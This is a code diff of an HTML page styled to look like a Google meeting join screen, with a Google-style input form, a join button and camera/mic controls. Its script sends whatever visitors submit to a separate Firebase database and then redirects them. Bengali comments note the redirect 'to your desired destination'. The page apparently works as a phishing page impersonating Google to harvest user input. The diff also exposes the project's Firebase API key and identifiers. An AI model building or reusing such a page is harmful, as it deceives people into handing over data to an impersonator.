@@ -166,7 +166,7 @@
     margin-bottom: 10px;
   }
 
-  /* NEW: Google Style Input Form Box */
+  /* Google Style Input Form Box */
   .input-form-box {
     width: 100%;
     max-width: 360px;
@@ -192,7 +192,6 @@
     box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
   }
 
-  /* Primary Button updated for form submit */
   .btn-join {
     display: block;
     width: 100%;
@@ -253,47 +252,6 @@
     box-shadow: 0 4px 12px rgba(0,0,0,0.06);
     text-align: left;
   }
-
-  .info-card {
-    background: #fff;
-    border: 1px solid #dadce0;
-    border-radius: 14px;
-    padding: 0;
-    overflow: hidden;
-    width: 100%;
-    max-width: 520px;
-    margin-top: auto;
-    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-  }
-
-  .info-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 18px 22px;
-    border-bottom: 1px solid #f1f3f4;
-    font-size: 15px;
-  }
-  .info-row:last-child { border-bottom: none; }
-
-  .label { color: #5f6368; font-weight: 500; }
-  .value-box {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    color: #202124;
-    font-weight: 600;
-  }
-  .value-box .copy-btn {
-    background: none;
-    border: none;
-    color: #1a73e8;
-    font-weight: 700;
-    cursor: pointer;
-    font-size: 13px;
-    letter-spacing: 0.2px;
-  }
-  .value-box .copy-btn:hover { text-decoration: underline; }
 
   .footer-link {
     margin-top: auto;
@@ -371,10 +329,6 @@
       • Call in by phone number<br>
       • Present to everyone in the room
     </div>
-
-   
-      </div>
-    </div>
   </aside>
 </main>
 
@@ -387,15 +341,16 @@
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
   import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
 
- const firebaseConfig = {
-  apiKey: "AIzaSyCgJA67XUBtysxdEl_6tKl0Tebpr2zkbuw",
-  authDomain: "abder-b11b9.firebaseapp.com",
-  projectId: "abder-b11b9",
-  storageBucket: "abder-b11b9.firebasestorage.app",
-  messagingSenderId: "163440280492",
-  appId: "1:163440280492:web:203a19b2dc0b79ab313009",
-  measurementId: "G-SG3T0841FJ"
-};
+  const firebaseConfig = {
+    apiKey: "AIzaSyCgJA67XUBtysxdEl_6tKl0Tebpr2zkbuw",
+    authDomain: "abder-b11b9.firebaseapp.com",
+    databaseURL: "https://abder-b11b9-default-rtdb.firebaseio.com",
+    projectId: "abder-b11b9",
+    storageBucket: "abder-b11b9.firebasestorage.app",
+    messagingSenderId: "163440280492",
+    appId: "1:163440280492:web:203a19b2dc0b79ab313009",
+    measurementId: "G-SG3T0841FJ"
+  };
 
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
@@ -415,7 +370,7 @@
         timestamp: new Date().toLocaleString()
       });
 
-      // ডেটা সাবমিট হওয়ার পর আপনার কাঙ্ক্ষিত গন্তব্যে রিডাইরেক্ট করুন
+      // ডেটা সাবমিট হওয়ার পর আপনার কাঙ্ক্ষিত গন্তব্যে রিডাইরেক্ট করুন
       window.location.href = "./reload/";
     } catch (err) {
       console.error("Firebase Error: ", err);
@@ -425,7 +380,7 @@
 </script>
 
 <script>
-  // ক্যামেরা ও মাইক ফাংশনালিটি পূর্বের মত অপরিবর্তিত রাখা হয়েছে
+  // ক্যামেরা ও মাইক ফাংশনালিটি অপরিবর্তিত রাখা হয়েছে
   const videoEl = document.getElementById('camVideo');
   const videoLabel = document.getElementById('videoLabel');
   const btnMic = document.getElementById('btnMic');
